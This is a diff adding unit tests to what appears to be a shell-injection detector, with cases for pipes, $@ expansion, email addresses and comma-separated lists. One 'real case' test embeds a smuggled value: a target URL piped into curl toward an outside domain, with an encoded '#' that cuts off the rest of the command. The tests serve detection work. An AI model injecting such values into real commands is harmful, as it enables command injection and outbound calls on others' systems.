@@ -358,3 +358,39 @@ def test_shell_injection_with_tilde():
 def test_no_shell_injection_with_tilde():
     is_not_shell_injection("~", "~")
     is_not_shell_injection("ls ~/path", "path")
+
+
+def test_real_case():
+    is_shell_injection(
+        "command -disable-update-check -target https://examplx.com|curl+https://cde-123.abc.domain.com+%23 -json-export /tmp/5891/8526757.json -tags microsoft,windows,exchange,iis,gitlab,oracle,cisco,joomla -stats -stats-interval 3 -retries 3 -no-stdin",
+        "https://examplx.com|curl+https://cde-123.abc.domain.com+%23",
+    )
+
+
+def test_false_positive_with_email():
+    is_not_shell_injection(
+        "echo token | docker login --username john.doe@acme.com --password-stdin hub.acme.com",
+        "john.doe@acme.com",
+    )
+
+
+def test_at_sign_with_shell_syntax():
+    is_shell_injection("'echo \"${array[@]}\"'", "${array[@]}")
+    is_shell_injection("echo $@", "$@")
+
+
+def test_allows_comma_separated_list():
+    is_not_shell_injection(
+        "command -tags php,laravel,drupal,phpmyadmin,symfony -stats",
+        "php,laravel,drupal,phpmyadmin,symfony",
+    )
+
+
+def test_it_flags_comma_in_loop():
+    is_shell_injection(
+        """command for (( i=0, j=10; i<j; i++, j-- ))
+    do
+        echo "$i $j"
+    done""",
+        "for (( i=0, j=10; i<j; i++, j-- ))",
+    )
